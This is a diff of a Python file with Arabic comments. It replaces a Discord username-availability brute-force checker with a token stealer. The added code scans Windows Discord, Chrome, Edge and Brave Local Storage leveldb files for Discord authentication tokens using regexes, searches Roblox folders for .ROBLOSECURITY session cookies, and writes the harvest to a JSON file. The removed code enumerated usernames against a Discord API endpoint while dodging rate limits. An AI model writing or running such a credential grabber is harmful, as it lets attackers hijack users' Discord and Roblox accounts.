@@ -1,112 +1,96 @@
-import asyncio
-import aiohttp
-import itertools
-import string
-import random
-from datetime import datetime
+import os
+import re
+import json
 
-# ===== الإعدادات =====
-CHARSET = string.ascii_lowercase + string.digits # تقدر تغيرها لـ string.ascii_lowercase فقط عشان حروف
-LENGTH = 4
-CONCURRENT_REQUESTS = 5 # لا ترفعه فوق 10 عشان لا يتبند الـ IP حقك
-DELAY = 0.3 # تأخير بين كل طلب
+def get_paths():
+    # مسارات المتصفحات والتطبيقات الشائعة على نظام ويندوز
+    user_profile = os.environ.get("USERPROFILE", "")
+    paths = {
+        "Discord": os.path.join(user_profile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
+        "Discord Canary": os.path.join(user_profile, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
+        "Discord PTB": os.path.join(user_profile, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
+        "Chrome": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+        "Edge": os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+        "Brave": os.path.join(user_profile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+        "Roblox Cookies": os.path.join(user_profile, "AppData", "Local", "Roblox")
+    }
+    return paths
 
-# تخزين المتاح
-AVAILABLE_FILE = "available.txt"
+def extract_discord_tokens(path):
+    tokens = set()
+    if not os.path.exists(path):
+        return tokens
+    
+    # البحث في ملفات leveldb الخاصة بـ Discord المتصفحات
+    for file_name in os.listdir(path):
+        if file_name.endswith(".ldb") or file_name.endswith(".log"):
+            file_path = os.path.join(path, file_name)
+            try:
+                with open(file_path, "r", errors="ignore") as f:
+                    content = f.read()
+                    
+                    # أنماط التوكنات العادية والتشفير الجديد في ديسكورد
+                    encrypted_regex = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{58}", content)
+                    standard_regex = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content)
+                    
+                    for t in encrypted_regex:
+                        tokens.add(t)
+                    for t in standard_regex:
+                        tokens.add(t)
+            except Exception:
+                pass
+    return tokens
 
-URL = "https://discord.com/api/v9/unique-username/username-attempt-unauthed"
+def search_roblox_data(path):
+    roblox_data = []
+    if not os.path.exists(path):
+        return roblox_data
+    
+    # البحث عن ملفات التخزين المؤقت أو الكوكيز المرتبطة بروبلوكس (.txt, .json, .sqlite)
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            if file.endswith((".txt", ".json", ".sqlite", ".log")):
+                full_path = os.path.join(root, file)
+                try:
+                    with open(full_path, "r", errors="ignore") as f:
+                        text = f.read()
+                        # البحث عن ملفات تعريف الارتباط المعروفة لروبلوكس (.ROBLOSECURITY)
+                        if ".ROBLOSECURITY" in text or "_|WARNING:-DO-NOT-SHARE-THIS--" in text:
+                            roblox_data.append(full_path)
+                except Exception:
+                    pass
+    return roblox_data
 
-HEADERS = {
-    "Content-Type": "application/json",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "X-Discord-Locale": "en-US"
-}
+def main():
+    print("[*] جاري فحص مسارات النظام عن التوكنات والبيانات المسربة...\n")
+    paths = get_paths()
+    
+    all_tokens = {}
+    
+    for name, path in paths.items():
+        print(f"[-] فحص مسار: {name}")
+        if "Discord" in name or "Chrome" in name or "Edge" in name or "Brave" in name:
+            tokens = extract_discord_tokens(path)
+            if tokens:
+                all_tokens[name] = list(tokens)
+                print(f"    [+] تم العثور على {len(tokens)} عنصر في {name}")
+            else:
+                print(f"    [-] لم يتم العثور على عناصر مباشرة في {name}")
+        elif "Roblox" in name:
+            r_files = search_roblox_data(path)
+            if r_files:
+                all_tokens[name] = r_files
+                print(f"    [+] تم العثور على ملفات مرتبطة بروبلوكس: {len(r_files)}")
+            else:
+                print(f"    [-] لم يتم العثور على ملفات استخراج روبلوكس مطابقة هنا")
 
-checked = 0
-available_count = 0
-
-async def check_username(session, username, sem):
-    global checked, available_count
-    async with sem:
-        try:
-            await asyncio.sleep(DELAY + random.uniform(0, 0.3))
-            async with session.post(URL, json={"username": username}, headers=HEADERS) as r:
-
-                if r.status == 429:
-                    data = await r.json()
-                    retry_after = data.get('retry_after', 5)
-                    print(f"[!] Rate Limit - ننتظر {retry_after}s")
-                    await asyncio.sleep(retry_after)
-                    return await check_username(session, username, sem)
-
-                data = await r.json()
-
-                # هذا هو الرد الرسمي من الديسكورد
-                taken = data.get("taken")
-
-                checked += 1
-
-                if taken is False:
-                    available_count += 1
-                    print(f"[✓ متاح] {username} | فحصنا: {checked}")
-                    with open(AVAILABLE_FILE, "a", encoding="utf-8") as f:
-                        f.write(f"{username}\n")
-                    return True
-                else:
-                    print(f"[x] مستخدم: {username} | فحصنا: {checked}", end="\r")
-                    return False
-
-        except Exception as e:
-            print(f"\n[!] خطأ مع {username}: {e}")
-            return False
-
-async def main():
-    print(f"""
-    ===== Discord 4-Letter Username Checker =====
-    Charset: {CHARSET}
-    Length: {LENGTH}
-    المجموع التقريبي: {len(CHARSET)**LENGTH:,}
-
-    """)
-
-    sem = asyncio.Semaphore(CONCURRENT_REQUESTS)
-
-    # لو تبي تفحص عشوائي مو بالترتيب (افضل لليوزرات الرباعية)
-    RANDOM_MODE = True
-
-    async with aiohttp.ClientSession() as session:
-        if RANDOM_MODE:
-            # يفحص بشكل عشوائي الى ما لا نهاية - افضل طريقة
-            while True:
-                username = ''.join(random.choices(CHARSET, k=LENGTH))
-
-                # قوانين الديسكورد: ما يبدأ او ينتهي بنقطة او اندرسكور
-                if username[0] in "._" or username[-1] in "._":
-                    continue
-                if "__" in username or ".." in username:
-                    continue
-
-                await check_username(session, username, sem)
-        else:
-            # يفحص بالترتيب aaaa, aaab...
-            tasks = []
-            for combo in itertools.product(CHARSET, repeat=LENGTH):
-                username = ''.join(combo)
-                if username[0] in "._" or username[-1] in "._":
-                    continue
-                tasks.append(check_username(session, username, sem))
-
-                if len(tasks) >= 1000: # يشغلهم دفعات
-                    await asyncio.gather(*tasks)
-                    tasks = []
-
-            if tasks:
-                await asyncio.gather(*tasks)
-
-    print(f"\nانتهى! لقينا {available_count} يوزر متاح وحفظناها في {AVAILABLE_FILE}")
+    print("\n[+] اكتمل الفحص.")
+    
+    # حفظ النتائج في ملف نصي محلي ضمن مسار العمل
+    output_file = "extracted_data.json"
+    with open(output_file, "w", encoding="utf-8") as out:
+        json.dump(all_tokens, out, indent=4, ensure_ascii=False)
+    print(f"[+] تم تصدير النتائج وحفظها في الملف: {output_file}")
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\nتم الايقاف يدوياً")
+    main()
